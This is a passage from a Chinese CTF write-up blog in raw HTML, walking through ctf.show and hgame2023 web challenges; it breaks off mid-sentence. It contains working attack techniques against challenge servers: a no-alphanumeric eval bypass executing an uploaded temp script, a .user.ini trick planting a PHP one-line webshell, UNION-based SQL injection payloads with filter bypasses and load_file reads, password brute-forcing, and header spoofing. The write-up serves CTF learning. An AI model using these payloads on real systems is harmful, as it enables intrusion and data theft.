class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>            <br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;cerror&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;serror&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>        <br>        &#125;<br>    <br>     <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>本来是无字母数字webshell，但这里过滤了这么多，唯独没有过滤字母 <code>p</code>，我们可以使用另一种方法</p><blockquote><p>在linux中，<code>source</code>命令（<code>.</code>命令），可以用来执行shell脚本</p></blockquote><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111408579.png" alt="image-20230411140844529"></p><p>我们又需要知道，</p><p>在php中临时文件目录一般在 <code>/tmp/</code>，并且php文件上传后命名格式为：<code>phpXXXXXX</code></p><p>因此，我们可以利用这些特点，上传shell脚本，然后使用<code>点命令</code>执行脚本，其他字母使用<code>通配符?</code>代替</p><p>但是我们又知道，在php中 <code>eval()</code>函数是没有回显的，怎么才能回显呢？</p><p>我们需要使用php短标签 <code>&lt;?=</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111414117.png" alt="image-20230411141425072"></p><p><code>&lt;?=</code>相当于echo函数进行输出</p><p>例如 <code>&lt;?=1;?&gt;</code>将会输出1</p><p>综上，我们可以先使用 <code>?&gt;</code>闭合前面的 <code>&lt;?</code> 然后再使用<code>&lt;?=</code>构造回显输出</p><p>编写上传html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://838ca3e8-ca28-409d-a101-712f9d3435b3.challenge.ctf.show/&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;1.txt&quot;</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;smt&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`.+/??p/p?p??????`</span>;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111420301.png" alt="image-20230411142039248"></p><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>文件上传漏洞，我们观察一下，是<code>nginx</code>服务器</p><p>我们可以上传一个 <code>.user.ini</code>文件，</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111427205.png" alt="image-20230411142753157" style="zoom: 67%;" /><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>文件内容的意思是让 <code>.user.ini</code> 目录下的php文件的文件头中都包含<code>1.txt</code>文件</p><p>然后我们在 1.txt中传入一个一句话木马</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111430592.png" alt="image-20230411143034545"></p><p>提示文件大小错误，可能是文件太长，</p><p>然后我们使用 <code>dirmap</code>扫到了 <code>upload.php.bak</code>文件</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111433246.png" alt="image-20230411143339163"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$temp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable">$size</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br><span class="hljs-variable">$error</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span> &gt; <span class="hljs-number">24</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file zise&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>)&gt;<span class="hljs-number">9</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ext_suffix</span>)&gt;<span class="hljs-number">3</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-variable">$ext_suffix</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>),<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_name</span>, <span class="hljs-string">&#x27;./&#x27;</span>.<span class="hljs-variable">$filename</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>&#125;<br><br> <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>发现长度不能超过24，我们改成这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure><p>然后蚁剑连接</p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;secret.php&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$c</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$url&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;@A@&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">555555</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">44444</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;@A@&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3333</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">222</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;@A@&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">222</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;@A@&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3333</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">44444</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;@A@&#x27;</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">555555</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;@A@&#x27;</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6000000</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$url</span>&quot;</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;@A@&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>case穿透，当我们传参<code>c=3</code>时，由于<code>case 3</code>没有加上break，会一直往下case，</p><p>这样就会执行：<code>echo &quot;$url&quot;;</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111446842.png" alt="image-20230411144644805"></p><p>访问该文件，在源码中发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;query&#x27;</span>]))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;@A@&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>看起来是sql注入，但是过滤了这些。</p><p>我们可以使用反引号 &#96; 绕过，MySQL中反引号一般用于保留字</p><p>查数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?query<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>database()<br></code></pre></td></tr></table></figure><p>查表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?query<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.`tables`<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;web&#x27;</span>#<br></code></pre></td></tr></table></figure><p>查字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?query<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.`columns`<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;content&#x27;</span>#<br></code></pre></td></tr></table></figure><p>查数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?query<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(password)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>content#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111458646.png" alt="image-20230411145822586"></p><p>提示secret有密码，由于前面有一个 <code>secret.php</code> ，所以我们使用 <code>load_file()</code>读取文件内容：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111500760.png" alt="image-20230411150013705"></p><p>读取：<code>/real_flag_is_here</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304111500392.png" alt="image-20230411150036333"></p><h3 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h3><p>也是一个登录页面，盲猜账号：admin，密码我们使用bp爆破</p><p>最终爆破得到，密码：admin888</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304102325173.png" alt="image-20230410232501070"></p><p>登录时抓包，base64解密得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>week1</title>
    <link href="/2023/08/24/week1/"/>
    <url>/2023/08/24/week1/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="【hgame2023】week1"><a href="#【hgame2023】week1" class="headerlink" title="【hgame2023】week1"></a>【hgame2023】week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><blockquote><p>兔兔最近迷上了一个纯前端实现的网页小游戏，但是好像有点难玩，快帮兔兔通关游戏！</p></blockquote><p>打开页面发现有一个js游戏，我们直接查看源码：</p><p><img src="https://s2.loli.net/2023/01/11/WgLS413z5fEHeos.png" alt="image-20230111213417547"></p><p>我们查找<code>alert</code>关键字：</p><p><img src="https://s2.loli.net/2023/01/11/6g97vtfGsIabTER.png" alt="image-20230111213824804"></p><p>发现了一串可疑的16进制ascii码，我们在控制台执行以下该js函数：</p><p><img src="https://s2.loli.net/2023/01/11/d6nriWu5zexIyvU.png" alt="image-20230111213917344"></p><p>flag直接出来了。</p><hr><p>我写题时发现了游戏结束的js代码：</p><p><img src="https://s2.loli.net/2023/01/11/nrotxASKeYHOamu.png" alt="image-20230111214047849"></p><p>游戏结束之后就调用了<code>mota()</code> 函数，说明该函数与flag有关</p><h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><blockquote><p>学校通知放寒假啦，兔兔兴高采烈的打算购买回家的车票，这时兔兔发现成为购票网站的会员账户可以省下一笔money…… 想成为会员也很简单，只需要一点点HTTP的知识……等下，HTTP是什么，可以吃吗</p></blockquote><p>打开网站，发现需要身份证明，</p><img src="https://s2.loli.net/2023/01/11/zueImwA5xS29KYt.png" alt="image-20230111214239871" style="zoom:33%;" /><p>我们先bp抓包一下：</p><p><img src="https://s2.loli.net/2023/01/11/2ZisyYlugk6c4dE.png" alt="image-20230111214402797"></p><p>我们发现响应头中有 <code>set-cookie</code> ，我们先来了解一下<code>php setcookie()</code> 基本原理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">setcookie</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$expires_or_options</span> = <span class="hljs-number">0</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$domain</span> = <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$secure</span> = <span class="hljs-literal">false</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$httponly</span> = <span class="hljs-literal">false</span><br>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><blockquote><h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><p>Cookie 有效的服务器路径。设置成 <code>&#39;/&#39;</code> 时，Cookie 对整个域名 <code>domain</code> 有效。如果设置成 <code>&#39;/foo/&#39;</code>，Cookie 仅仅对 <code>domain</code> 中 <code>/foo/</code> 目录及其子目录有效（比如 <code>/foo/bar/</code>）。默认值是设置 Cookie 时的当前目录。</p><h3 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h3><p>Cookie 的有效域名&#x2F;子域名。设置成子域名（例如 <code>&#39;www.example.com&#39;</code>），会使 Cookie 对这个子域名和它的三级域名有效（例如 w2.<a href="http://www.example.com).要让/">www.example.com）。要让</a> Cookie 对整个域名有效（包括它的全部子域名），只要设置成域名就可以了（这个例子里是 <code>&#39;example.com&#39;</code>）。</p><h3 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h3><p>设置成 **<code>true</code>**，Cookie 仅可通过 HTTP 协议访问。这意思就是 Cookie 无法通过类似 JavaScript 这样的脚本语言访问。要有效减少 XSS 攻击时的身份窃取行为，可建议用此设置（虽然不是所有浏览器都支持），不过这个说法经常有争议。 <strong><code>true</code></strong> 或 <strong><code>false</code></strong></p></blockquote><p>通过上述介绍知道了，</p><p><code>path</code> 会设置cookie有效服务器路径，由于此处的值为 <code>/</code> 所以对服务器所有路径都有效。</p><p><code>domain</code>设置cookie的有效域名，由于此处设置为 <code>localhost</code> ，所以只有本地有效，我们是使用不了的</p><p><code>httponly</code> 设置了httponly会导致js代码 <code>document.cookie</code> 获取不了cookie，可以减少xss攻击</p><p>此处由于该cookie没有保存到本地，所以我们换一个想法。</p><p>我们重新认识一下 <code>User-Agent</code>，中文名：用户代理。其实很多时候我们已经潜意识的认为UA就是浏览器的标识，其实UA的作用简要的说就是判断浏览器的相关信息等等。但是UA还能用来判断身份，判断是否为爬虫还是浏览器。</p><p>由于此处题目需要我们提供身份证明 <code>Cute-Bunny</code>，我们将UA改为该字符串：</p><p><img src="https://s2.loli.net/2023/01/11/BaPmwq14G7O3f6I.png" alt="image-20230111220355305"></p><p>发现成功了，并且需要我们持有邀请码code，这不就是cookie里的东西嘛，我们放到cookie里：<code>code=Vidar</code></p><p><img src="https://s2.loli.net/2023/01/11/sneI1Kw3JHxUChM.png" alt="image-20230111220536553"></p><p>然后要我们来自该网址，我们只需要添加 <code>Referer</code> 即可：</p><p><img src="https://s2.loli.net/2023/01/11/J9RTXK4SmnzQaNb.png" alt="image-20230111220639970"></p><p>要我们使用本地请求，我们添加 <code>XFF</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/11/zqekUPrWHwT6LSm.png" alt="image-20230111220756109"></p><p>要我们添加 json 串，很简单，大括号{}括起来，然后里面的元素使用双引号包裹即可：</p><p><img src="https://s2.loli.net/2023/01/11/lWb89I5xkOremu3.png" alt="image-20230111220944663"></p><h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><blockquote><p>刚加入Vidar的兔兔还认不清协会成员诶，学长要求的答对100次问题可太难了，你能帮兔兔写个脚本答题吗？</p></blockquote><p>进入题目，发现要我们猜答案：</p><p><img src="https://s2.loli.net/2023/01/12/4SGNrEKW79LpqzV.png" alt="image-20230112110816347"></p><p>源代码中发现提示，下载该json文件：</p><p><img src="https://s2.loli.net/2023/01/12/vjXaGAcU8TZb7Lp.png" alt="image-20230112110902033"></p><p>此时我们应该知道了，这题的意思是让我们根据 <code>intro</code>  猜测 <code>id</code> ，写一个python脚本即可：</p><p>我们先将该文件保存为 <code>json</code> 文件，去除文件头的 <code>export default</code>:</p><p><img src="https://s2.loli.net/2023/01/12/1xwZAhvKGJl75VB.png" alt="image-20230112111148262"></p><p>然后我们编写python脚本，我们使用 <code>json.load()</code> 函数将<code>json</code>文件转换为一个 python对象，此处转换为 <code>python列表</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">member_data = json.load(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;member.json&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>))<br></code></pre></td></tr></table></figure><p>这样我们可以根据 <code>member_data</code> 列表获得相应的 id,intro 数据：</p><p>例如，我们想要获得json文件第一个的id，intro：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">member_data[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;id&#x27;</span>]    <span class="hljs-comment"># ba1van4</span><br>member_data[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;intro&#x27;</span>] <span class="hljs-comment"># 21级 / 不会Re / 不会美工 / 活在梦里 / 喜欢做不会的事情 / ◼◻粉</span><br></code></pre></td></tr></table></figure><p>我们观察网页，发现我们验证时会有三个数据包：</p><img src="https://s2.loli.net/2023/01/12/ILevMk2Aji39BVQ.png" alt="image-20230112111648530" style="zoom:33%;" /><p>分别代表： 获得问题、获得分数、验证id 的功能并且都是 json字符串形式，</p><p>我们想要将json字符串转换为python对象，需要使用 <code>json.loads()</code> 方法。</p><p>我们观察一下 <code>getQuestion</code> 接口的内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;15 级 / 什么都不会的开发 / 打什么都菜&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>发现它是 json 字符串，我们想要获得 <code>message</code> 的内容需要这么做：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">json.loads(<span class="hljs-string">&#x27;&#123;&quot;message&quot;:&quot;15 级 / 什么都不会的开发 / 打什么都菜&quot;&#125;&#x27;</span>)[<span class="hljs-string">&#x27;message&#x27;</span>]<br></code></pre></td></tr></table></figure><p>先使用 <code>json.loads()</code> 将json字符串转化为字典，然后使用字典特性获得 message内容。</p><p>然后我们使用 requests 